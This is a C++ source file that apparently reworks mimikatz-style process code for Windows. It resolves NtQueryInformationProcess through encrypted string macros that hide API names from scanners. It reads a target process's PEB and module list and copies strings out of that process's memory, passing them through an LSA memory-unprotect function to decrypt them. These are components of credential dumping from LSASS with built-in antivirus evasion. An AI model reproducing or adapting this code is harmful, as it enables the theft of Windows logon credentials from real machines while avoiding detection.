/*
	lpprocess.cpp
	mod_process in procedure style
*/

#include <Windows.h>

#include "secpkg.h"
#include "mod_ntddk.h"
#include "lpmemory.h"
#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\CryptoStrings.h"

#include "lpprocess.h"

bool lp_getProcessBasicInformation(PROCESS_BASIC_INFORMATION * mesInfos, HANDLE processHandle)
{
	bool reussite = false;
	LPWSTR wszNtdll;
	LPSTR szNtQueryInformationProcess;

	wszNtdll = CRSTRW("ntdll", "\xfd\x3f\xe2\x05\xf8\x3f\xec\x19\xe9\x2b\x0e");
	szNtQueryInformationProcess = CRSTRA("NtQueryInformationProcess", "\xfc\x7f\x7c\x01\xe5\x7f\x52\x1d\xdd\x72\x99\xfb\x15\xae\xb2\xcf\x23\xb5\xd1\xa8\x58\xce\xf3\x87\x5c\xf5\x13\x6a\x89\x14\x2f");

	if (processHandle == INVALID_HANDLE_VALUE)
		processHandle = GetCurrentProcess();

	if (PNT_QUERY_INFORMATION_PROCESS NtQueryInformationProcess = reinterpret_cast<PNT_QUERY_INFORMATION_PROCESS>(GetProcAddress(GetModuleHandle(wszNtdll), szNtQueryInformationProcess)))
	{
		ULONG sizeReturn;
		reussite = NT_SUCCESS(NtQueryInformationProcess(processHandle, ProcessBasicInformation, mesInfos, sizeof(PROCESS_BASIC_INFORMATION), &sizeReturn)) && (sizeReturn == sizeof(PROCESS_BASIC_INFORMATION));
	}

	my_free(wszNtdll);
	my_free(szNtQueryInformationProcess);

	return reussite;
}

bool lp_getPeb(PEB * peb, HANDLE processHandle)
{
	bool reussite = false;
	PROCESS_BASIC_INFORMATION * mesInfos = new PROCESS_BASIC_INFORMATION();
	if (lp_getProcessBasicInformation(mesInfos, processHandle))
	{
		reussite = lp_readMemory(mesInfos->PebBaseAddress, peb, sizeof(PEB), processHandle);
	}
	delete mesInfos;
	return reussite;
}

bool lp_getVeryBasicModulesListForProcess(MODULE_INFO_CALLBACK miCallback, LPVOID pCallbackParam, HANDLE processHandle)
{
	bool reussite = false;
	PEB * monPeb = new PEB();
	if (lp_getPeb(monPeb, processHandle))
	{
		PEB_LDR_DATA * monLoader = new PEB_LDR_DATA();
		if (lp_readMemory(monPeb->LoaderData, monLoader, sizeof(PEB_LDR_DATA), processHandle))
		{
			PBYTE aLire, fin;
			LDR_DATA_TABLE_ENTRY monEntry;
			for (
				aLire = PBYTE(monLoader->InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
				fin = (PBYTE)(monPeb->LoaderData) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
			aLire != fin;
			aLire = (PBYTE)monEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
				)
			{
				if (reussite = lp_readMemory(aLire, &monEntry, sizeof(monEntry), processHandle))
				{
					KIWI_VERY_BASIC_MODULEENTRY monModule = {
						reinterpret_cast<PBYTE>(monEntry.DllBase),
						monEntry.SizeOfImage,
						lp_getUnicodeStringOfProcess(&monEntry.BaseDllName, processHandle)
					};
					//monModuleVector->push_back(monModule);
					miCallback(&monModule, pCallbackParam);

					// free buffer allocated at lp_getUnicodeStringOfProcess()
					my_free(monModule.szModule);
				}
			}
		}
		delete monLoader;
	}
	delete monPeb;
	return reussite;
}

LPWSTR lp_getUnicodeStringOfProcess(UNICODE_STRING * ptrString, HANDLE process, PLSA_PROTECT_MEMORY unProtectFunction)
{
	LPWSTR maChaine = NULL;

	// check for bogus ptrString->Length in some cases
	if (ptrString->Length > ptrString->MaximumLength) { DbgPrint("ERR: bogus str chunk found: len %u while maxlen %u, throwing record away", ptrString->Length, ptrString->MaximumLength); return NULL; }

	if (ptrString->Buffer && (ptrString->Length > 0))
	{
		BYTE * monBuffer = new BYTE[ptrString->MaximumLength];



		if (lp_readMemory(ptrString->Buffer, monBuffer, ptrString->MaximumLength, process))
		{

			//DbgPrint("read to buffer at %p max_len %u len %u", monBuffer, ptrString->MaximumLength, ptrString->Length);


			if (unProtectFunction) {
				//DbgPrint("asked to call unProtectFunction from %04Xh for buffer at %04Xh max_len %u len %u", unProtectFunction, monBuffer, ptrString->MaximumLength, ptrString->Length);
				unProtectFunction(monBuffer, ptrString->MaximumLength);
				//DbgPrint("unProtectFunction call finished");
			}
			//maChaine.assign(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monBuffer), ptrString->Length));
			maChaine = (LPWSTR)my_alloc((ptrString->Length * 2) + 2);
			if (ptrString->Length) { 
				lstrcpynW(maChaine, (LPWSTR)monBuffer, (ptrString->Length / 2) + 1); 
				//DbgPrint("res_str [%ws]", maChaine);
			}

		} //else { DbgPrint("WARN: readMemory failed"); }
		delete[] monBuffer;
	} //else { DbgPrint("WARN: empty buffers"); }

	return maChaine;
}